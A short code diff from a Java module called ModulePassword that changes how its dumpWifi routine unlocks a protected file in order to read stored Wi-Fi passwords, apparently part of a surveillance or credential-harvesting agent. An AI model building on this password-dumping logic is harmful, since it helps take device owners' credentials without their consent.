@@ -130,7 +130,7 @@ public class ModulePassword extends BaseModule {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 		}
-		if (!Path.unprotect(filename, 3, false)) {
+		if (!Path.unprotect(filename, 2, true)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpWifi) no passwords found");
 			}
